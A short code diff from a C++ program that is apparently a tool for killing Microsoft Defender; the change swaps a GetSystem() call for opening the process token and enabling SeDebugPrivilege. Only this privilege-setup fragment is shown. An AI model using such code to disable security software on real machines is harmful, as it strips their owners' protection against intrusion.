@@ -9,10 +9,18 @@ int main(int argc, char** argv)
 	}
 	std::string inputSwitch = argv[1];
 
-	auto success = GetSystem();
+	wil::unique_handle tokenHandle;
+	auto success = ::OpenProcessToken(::GetCurrentProcess(), TOKEN_ALL_ACCESS, &tokenHandle);
 	if (!success)
 	{
-		std::cout << "[-] Failed to kill Defender...\n";
+		std::cout << "[-] Failed to open current process token, exiting...\n";
+		return 0;
+	}
+
+	success = SetPrivilege(tokenHandle.get(), L"SeDebugPrivilege", true);
+	if (!success)
+	{
+		std::cout << "[-] Failed to enable SeDebugPrivilege, exiting...\n";
 		return 0;
 	}
 
